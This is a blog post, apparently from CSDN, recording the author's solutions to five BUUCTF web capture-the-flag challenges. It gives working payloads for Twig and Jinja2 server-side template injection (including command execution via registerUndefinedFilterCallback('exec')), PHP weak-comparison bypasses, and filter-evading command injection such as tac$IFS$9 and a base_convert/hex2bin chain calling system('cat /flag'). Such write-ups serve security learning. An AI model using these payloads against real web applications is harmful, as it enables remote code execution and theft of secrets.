{"blogid": "125483917", "writerAge": "码龄1年", "writerBlogNum": "13", "writerCollect": "6", "writerComment": "0", "writerFan": "75", "writerGrade": "2级", "writerIntegral": "151", "writerName": "不用再等", "writerProfileAdress": "writer_image\\profile_125483917.jpg", "writerRankTotal": "90222", "writerRankWeekly": "169859", "writerThumb": "4", "writerVisitNum": "5374", "blog_read_count": "847", "blog_time": "于 2022-06-27 17:23:56 发布", "blog_title": "BUUCTF 个人做题记录【6-27】", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"-toc\" style=\"margin-left:40px;\"></p>\n<p id=\"1.%5BBJDCTF2020%5DCookie%20is%20so%20stable1-toc\" style=\"margin-left:40px;\"><a href=\"#1.%5BBJDCTF2020%5DCookie%20is%20so%20stable1\">1.[BJDCTF2020]Cookie is so stable1</a></p>\n<p id=\"2.%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1-toc\" style=\"margin-left:40px;\"><a href=\"#2.%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1\">2.[WUSTCTF2020]朴实无华1</a></p>\n<p id=\"3.%5BASIS%202019%5DUnicorn%20shop%201-toc\" style=\"margin-left:40px;\"><a href=\"#3.%5BASIS%202019%5DUnicorn%20shop%201\">3.[ASIS 2019]Unicorn shop 1</a></p>\n<p id=\"4.%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math1-toc\" style=\"margin-left:40px;\"><a href=\"#4.%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math1\">4.[CISCN 2019 初赛]Love Math1</a></p>\n<p id=\"5.%5BWesternCTF2018%5Dshrine%201-toc\" style=\"margin-left:40px;\"><a href=\"#5.%5BWesternCTF2018%5Dshrine%201\">5.[WesternCTF2018]shrine 1</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h2 id=\"1.%5BBJDCTF2020%5DCookie%20is%20so%20stable1\">1.[BJDCTF2020]Cookie is so stable1</h2>\n<p><img alt=\"\" height=\"773\" src=\"image\\3929a9e811e7489eb49b09305d71ca15.png\" width=\"1200\"/>有两个界面，Flag和Hint</p>\n<p>Flag </p>\n<p><img alt=\"\" height=\"445\" src=\"image\\ac9287e383f64f7bb7837b67e762c39a.png\" width=\"1200\"/> Hint</p>\n<p><img alt=\"\" height=\"509\" src=\"image\\9e78386473e84ee0bb13ec46d0e15444.png\" width=\"1200\"/></p>\n<p>利用点在Flag,随便输入一个id，抓包看看</p>\n<p><img alt=\"\" height=\"634\" src=\"image\\79551e3f8a354ad6b251f551ecb546e7.png\" width=\"1200\"/></p>\n<p> 用ssti模板注入试试，</p>\n<p><strong>尝试{<!-- -->{7*7}}, 返回49</strong></p>\n<p><strong>尝试{<!-- -->{7*'7'}},返回49,说明是Twig模板，但是如果返回7777777，则说明是Jinia2模板</strong></p>\n<p><strong>本题是Twig模板</strong></p>\n<p><strong>参考：</strong><a href=\"https://blog.csdn.net/RABCDXB/article/details/115442449?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BBJDCTF2020%5DCookie%20is%20so%20stabl&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115442449.nonecase&amp;spm=1018.2226.3001.4187\" title=\"(4条消息) [BJDCTF2020]Cookie is so stable_Sk1y的博客-CSDN博客\">(4条消息) [BJDCTF2020]Cookie is so stable_Sk1y的博客-CSDN博客</a></p>\n<p><img alt=\"\" height=\"537\" src=\"image\\39c6f93d2c57483188c1a2ebce2cc0b6.png\" width=\"1091\"/></p>\n<p> 7*7这个算式被系统执行了，在页面上返回计算结果，加入{<!-- -->{}}里的不是算式，而是代码呢？</p>\n<p>试试</p>\n<p><img alt=\"\" height=\"528\" src=\"image\\3118765b7c7e443cb56b312f5e00990e.png\" width=\"1200\"/></p>\n<p>命令没有被执行，猜测存在过滤，又或许是另一种注入方式</p>\n<p><a href=\"https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig\" title=\"一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n's Blog\">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n's Blog</a></p>\n<p> payload:</p>\n<pre><code>{<!-- -->{_self.env.registerUndefinedFilterCallback(\"exec\")}}\n\n{<!-- -->{_self.env.getFilter(\"id\")}}</code></pre>\n<p><img alt=\"\" height=\"635\" src=\"image\\63fb68c0c47347218002cbee0c6c7c00.png\" width=\"1200\"/></p>\n<h2></h2>\n<h2 id=\"2.%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1\">2.[WUSTCTF2020]朴实无华1</h2>\n<p><img alt=\"\" height=\"212\" src=\"image\\b0439d31a41446dd80d4c5bb93628247.png\" width=\"1200\"/> 还是抓包</p>\n<p><img alt=\"\" height=\"561\" src=\"image\\e5143d7fb33b4bc4b2886f50d2c442de.png\" width=\"1200\"/></p>\n<p>没有收获，那就扫目录用dirsearch扫，为节省建议只扫常见的目录，配置是：</p>\n<p>./dirsearch.py -e bak,zip,txt,tgz,php -u http:.....  -s 3 -t 20</p>\n<p>调线程是为了防止扫太快导致有些敏感目录扫不出来</p>\n<p>求快也可以只用御剑，虽然也能扫，但不建议。</p>\n<p>目录扫描会扫到一个robots.txt</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\98093ec1cc234f7a93a804b4e0ea05b5.png\"/></p>\n<p> 访问</p>\n<p><img alt=\"\" height=\"276\" src=\"image\\c65e7ab096ae48349eaf64e06618d696.png\" width=\"979\"/></p>\n<p>再访问</p>\n<p><img alt=\"\" height=\"258\" src=\"image\\67e8abae29fb45569fc0f41c6574cffb.png\" width=\"919\"/></p>\n<p>假的？抓包看看有没有可用的信息</p>\n<p><img alt=\"\" height=\"351\" src=\"image\\b8edfdb33c6744908b015a1d24369b78.png\" width=\"1112\"/> </p>\n<p>此地无银三百两，访问看看</p>\n<p><img alt=\"\" height=\"863\" src=\"image\\114e4f18eda14d359ab2799ae155f5f4.png\" width=\"1200\"/> </p>\n<p>这就找到了源码，接着代码审计</p>\n<p><img alt=\"\" height=\"696\" src=\"image\\52d4540e74a54448a5564b87c43436e8.png\" width=\"837\"/> </p>\n<p>GET方式传入三个参数</p>\n<p>1.num:intval(num&lt;2020)&amp;&amp;intval(num+1)&gt;2021</p>\n<p>intval函数获取字符（串）的数字，而如果参数是一个算术表达式，会先将所有的参数都化为数字，再进行数值计算</p>\n<pre><code>&lt;?php\n    $a = '2e4';\n    var_dump($a);\n    var_dump(intval($a));\n    $b = $a + 1;\n    echo $b.\"\\n\";\n    var_dump($b);\n    var_dump(intval($b));\n </code></pre>\n<p> 结果</p>\n<pre><code>string(3) \"2e4\"\nint(2)\n20001\nfloat(20001)\nint(20001)</code></pre>\n<p>payload1:</p>\n<p>num=2e4</p>\n<p>2.md5:md5==md5(md5)</p>\n<p><strong>看到==，就想到了php弱比较，php会将以0x开头的字符串，当进行==弱比较时，会认为是相同的。</strong></p>\n<p>所以就变成了找到一个以0x开头的字符串s,并且md5(s)也是以0x开头的字符串。</p>\n<pre><code>   //第二个md5绕过\n    $c = \"0e215962017\";\n    echo \"$c\".\"\\n\";\n    $d = md5($c);\n    echo \"$d\".\"\\n\";\n    if ($c==$d)\n        echo \"成功绕过\".\"\\n\";</code></pre>\n<pre><code>0e215962017\n0e291242476940776845150308577824\n成功绕过</code></pre>\n<p> payload2:</p>\n<p>md5=<strong>0e215962017</strong></p>\n<p>3.get_flag</p>\n<p>strstr() 函数搜索字符串在另一字符串中的第一次出现，并且返回字符串的剩余部分。如果找不到要找的字符串，则返回false.</p>\n<p>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。</p>\n<p>不能有cat和空格，否则会被替换为wctf2020,用tac代替，空格用<strong><code>$IFS$9代替，</code></strong>先ls查看当前目录下的文件</p>\n<p><img alt=\"\" height=\"599\" src=\"image\\5e44b79873704611b5e0c1e4e10e45e0.png\" width=\"1183\"/></p>\n<p>接着查看</p>\n<p><strong>关于tac</strong></p>\n<p><strong>cat 和 tac 都是Linux打印文件的命令，但是cat是从第一行至最后一行顺序打印，而tac是最后一行至第一行反向打印。</strong></p>\n<p><strong>本地测试</strong></p>\n<p>首先再一个文件夹中创建两个文件,flag和a.php</p>\n<pre><code>&lt;?php\n//a.php\n \n\tsystem(\"ls\");\n\techo \"&lt;br&gt;\";\n\tsystem(\"cat flag\");\n\techo \"&lt;br&gt;\"; \n\tsystem(\"tac flag\");\n?&gt;</code></pre>\n<p>flag文件</p>\n<pre><code>//flag文件\n这是flag\n1\n2\n3</code></pre>\n<p>结果</p>\n<p><img alt=\"\" src=\"image\\20210420192831563.png\"/></p>\n<p> paylaod3:</p>\n<p>get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>\n<p><img alt=\"\" height=\"612\" src=\"image\\9b4e2252bf094e7bab70807213edfbf5.png\" width=\"1200\"/></p>\n<p>参考博客：</p>\n<p><a href=\"https://blog.csdn.net/RABCDXB/article/details/115842444?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=intval%28num%29%3C2020&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115842444.142%5Ev21%5Epc_rank_34,157%5Ev15%5Enew_3&amp;spm=1018.2226.3001.4187\" title=\"(4条消息) [WUSTCTF2020]朴实无华_Sk1y的博客-CSDN博客\">(4条消息) [WUSTCTF2020]朴实无华_Sk1y的博客-CSDN博客</a> </p>\n<p></p>\n<h2 id=\"3.%5BASIS%202019%5DUnicorn%20shop%201\">3.[ASIS 2019]Unicorn shop 1</h2>\n<p><img alt=\"\" height=\"803\" src=\"image\\dbfb9990ef1c4153a88ae4372e8eb70d.png\" width=\"1200\"/></p>\n<p> </p>\n<p>ID输入1，2，3，Price填对应的价格，结果是这样的</p>\n<p><img alt=\"\" height=\"166\" src=\"image\\a65a743dddc74a88b5d7d754d605ab01.png\" width=\"999\"/></p>\n<p> </p>\n<p>ID输入4，Price它的价格，结果是这样的</p>\n<p><img alt=\"\" height=\"162\" src=\"image\\e953194a19e24077a627f1c0ed4cad1c.png\" width=\"840\"/></p>\n<p> 这有点特殊，只允许输入一个字符，这个字符代表的数字大于等于1337，那就看看有那个字符代表的字符是大于等于1337的（很多）</p>\n<p>链接：<a href=\"https://www.compart.com/en/unicode/\" title=\"Unicode - Compart\">Unicode - Compart</a></p>\n<p>比如，在搜索框中输入million,</p>\n<p><img alt=\"\" height=\"817\" src=\"image\\5686ad90ed2e4d2e8e0ee36d22d973f6.png\" width=\"1200\"/></p>\n<p> 这个字符代表的数字是100000，绝对够了</p>\n<p><img alt=\"\" height=\"137\" src=\"image\\e33610b909a54c978e5e7828be1ac71a.png\" width=\"789\"/></p>\n<p>给的太多了，那换thousand</p>\n<p><img alt=\"\" height=\"839\" src=\"image\\a048477f497e4d89849479a687717970.png\" width=\"1200\"/></p>\n<p>给10000试试</p>\n<p><img alt=\"\" height=\"170\" src=\"image\\c79b104ae63a44cb9dc0ad0403e4da8d.png\" width=\"845\"/> </p>\n<p> </p>\n<h2 id=\"4.%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math1\">4.[CISCN 2019 初赛]Love Math1</h2>\n<p><img alt=\"\" height=\"502\" src=\"image\\be80505c0a8341259898c561a8f87022.png\" width=\"1200\"/></p>\n<p>源码的意思，就是要我们用白名单里的数学函数，构造出一条等价于cat /flag的命令，同时不能出现黑名单里的字符，字符总长度不超过80</p>\n<p>参考：<a href=\"https://blog.csdn.net/shinygod/article/details/123636571?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=CISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math%201&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-123636571.nonecase&amp;spm=1018.2226.3001.4187\" title=\"(4条消息) [CISCN 2019 初赛]Love Math 1_succ3的博客-CSDN博客\">(4条消息) [CISCN 2019 初赛]Love Math 1_succ3的博客-CSDN博客</a></p>\n<p>我们可以用变量拼接，那么如何拼接呢？我们可以看一下下面这个函数，里面可以有36进制，也就是说我们可以得到任意小写字母，那么我们就可以尝试构造_GET,但是这需要大写字母，而在php中有个hex2bin可以把16进制转换为字符串，可以通过hex2bin来构造_GET。且hex2bin可以这么构造base_convert(37907361743,10,36)，意思是把37907361743转换为36进制，也就是hex2bin<br/>  </p>\n<p> <img alt=\"在这里插入图片描述\" src=\"image\\befdfdbc04b84f66865d9890b49d10a0.png\"/></p>\n<p>那么问题又来了，怎么得到<code>_GET</code>的16进制呢？我们可以通过一个数学函数<code>dechex</code>,它可以把十进制转十六进制，构造<code>dechex(1598506324)</code>，十六进制是<code>5f474554</code></p>\n<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))\n//分解\n//$pi=base_convert(37907361743,10,36)(5f474554)\n//$pi=hex2bin(5f474554)\n//$pi=_GET\n</code></pre>\n<p> 现在我们就可以通过变量代换来构造payload。</p>\n<pre><code>​\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag\n//$$pi=$_GET\n//{pi}==[pi],这里的pi为我们要填的shell\n//(($$pi){abs})同理\n//&amp;pi=system&amp;abs=cat /flag，把这句命令分两部分传参，因为空格被过滤了，只能构造两个get传参\n\n​</code></pre>\n<p> <img alt=\"\" height=\"182\" src=\"image\\ad9c9257094449eaaf0470aee05a5f0a.png\" width=\"1200\"/></p>\n<p> </p>\n<p> </p>\n<h2 id=\"5.%5BWesternCTF2018%5Dshrine%201\">5.[WesternCTF2018]shrine 1</h2>\n<p><img alt=\"\" height=\"227\" src=\"image\\da8ff22b420143789bb0ec66456572c3.png\" width=\"1200\"/></p>\n<p>打开看到的页面就是源码，整理一下</p>\n<pre><code>import flask\nimport os\n\napp = flask.Flask(__name__)\n\napp.config['FLAG'] = os.environ.pop('FLAG')\n\n@app.route('/')\ndef index():\n    return open(__file__).read()\n\n@app.route('/shrine/&lt;path:shrine&gt;')\ndef shrine(shrine):\n\n    def safe_jinja(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self']\n        return ''.join(['{<!-- -->{% set {}=None%}}'.format(c) for c in blacklist]) \n        + s\n\n    return flask.render_template_string(safe_jinja(shrine))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n</code></pre>\n<p>题目存在ssti漏洞，框架是flask,在/shrine路径下测试一下ssti，</p>\n<p><span style=\"color:#fe2c24;\">/shrine/{<!-- -->{1+1}}</span></p>\n<p><img alt=\"\" height=\"202\" src=\"image\\bffa9e8a420a41acb77cdcbe211a812b.png\" width=\"1125\"/></p>\n<p> 下面分析源码：</p>\n<p><strong>app.config['FLAG'] = os.environ.pop('FLAG')</strong></p>\n<p><strong>注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{<!-- -->{config}}即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</strong></p>\n<p><strong>return ''.join(['{<!-- -->{% set {}=None%}}'.format(c) for c in blacklist]) + s</strong></p>\n<p><strong>上面这行代码把黑名单的东西遍历并设为空，也就是不能有名为config和def的参数,但如果这两个字符串作为非参数传入（例如参数值）则不受影响</strong></p>\n<p><span style=\"color:#fe2c24;\"><strong>Python中常用于ssti的魔术方法<br/> __class__：返回类型所属的对象<br/> __mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br/> __base__：返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的<br/> __subclasses__：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br/> __init__：类的初始化方法<br/> __globals__：对包含函数全局变量的字典的引用<br/> __builtins__：builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块.</strong></span> </p>\n<p><span style=\"color:#fe2c24;\">在Flask框架渲染模板时，可以直接在模板中使用的模板变量及函数：config、request、url_for()、get_flashed_messages()。</span></p>\n<p><strong>url_for()函数查看flag<br/> 我们可以使用flask框架的url_for函数：from flask import url_for。<br/> url_for()作用:<br/> (1)给指定的函数构造 URL。<br/> (2)访问静态文件(CSS、JavaScript等)。只要在你的包中或是模块的所在目录中创建一个名为static的文件夹，在应用中使用 /static即可访问。<br/> 所以我们可以用url_for函数来查看当前包中所有的静态文件，其中肯定就包括了配置文件。<br/> 先查看url_for函数的全局变量的字典的引用</strong>：</p>\n<p><span style=\"color:#fe2c24;\">/shrine/{<!-- -->{url_for.__globals__['current_app'].config['FLAG']}}</span><br/><img alt=\"\" height=\"271\" src=\"image\\51bfe1340b7b4072a3f02e99709df657.png\" width=\"1200\"/></p>\n<p><strong> get_flashed_messages()函数查看flag<br/>   返回之前在Flask中通过flash()函数传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages()方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。<br/>   flask闪现是基于flask内置的session的，利用浏览器的session缓存闪现信息。之前的每次flash()函数都会缓存一个信息，之后再通过get_flashed_messages()函数访问缓存的信息。<br/>   flash()函数有三种形式缓存数据：<br/> （1）缓存字符串内容。<br/> 设置闪现内容：flash(‘恭喜您登录成功’)<br/> 模板取出闪现内容：{% with messages = get_flashed_messages() %}<br/> （2）缓存默认键值对。当闪现一个消息时，是可以提供一个分类的。未指定分类时默认的分类为 ‘message’ 。<br/> 设置闪现内容：flash(‘恭喜您登录成功’,“status”)<br/> 模板取出闪现内容：{% with messages = get_flashed_messages(with_categories=true) %}<br/> （3）缓存自定义键值对。<br/> 设置闪现内容：flash(‘您的账户名为admin’,“username”)<br/> 模板取出闪现内容：{% with messages = get_flashed_messages(category_filter=[“username”])<br/> 所以我们可以通过get_flashed_messages()来获取所有缓存的闪现内容：</strong></p>\n<p><br/><span style=\"color:#fe2c24;\">/shrine/{<!-- -->{get_flashed_messages.__globals__['current_app'].config['FLAG']}}</span></p>\n<p> </p>\n<p><img alt=\"\" height=\"216\" src=\"image\\8d1cfe199fa849c8a0b29a4050b182e3.png\" width=\"900\"/></p>\n<p>参考博客：</p>\n<p><a href=\"https://blog.csdn.net/qq_43801002/article/details/107715987?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165631925516780366574468%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165631925516780366574468&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-107715987-null-null.142%5Ev24%5Ehuaweicloudv2,157%5Ev15%5Enew_3&amp;utm_term=%5BWesternCTF2018%5Dshrine+1&amp;spm=1018.2226.3001.4187\" title=\"(4条消息) [WesternCTF2018]shrine_浩歌已行的博客-CSDN博客_shrine\">(4条消息) [WesternCTF2018]shrine_浩歌已行的博客-CSDN博客_shrine</a></p>\n<p><a href=\"https://blog.csdn.net/Onlyone_1314/article/details/121875761?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165631992216782248549763%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165631992216782248549763&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-121875761-null-null.142%5Ev24%5Ehuaweicloudv2,157%5Ev15%5Enew_3&amp;utm_term=url_for%E5%92%8Cget_flashed_messages&amp;spm=1018.2226.3001.4187\" title=\"(4条消息) XCTF-攻防世界CTF平台-Web类——16、shrine（Flask框架之Jinja2模板渲染引擎、查看app.config[‘FLAG‘]）_大灬白的博客-CSDN博客\">(4条消息) XCTF-攻防世界CTF平台-Web类——16、shrine（Flask框架之Jinja2模板渲染引擎、查看app.config[‘FLAG‘]）_大灬白的博客-CSDN博客</a></p>\n</div>\n</div>"}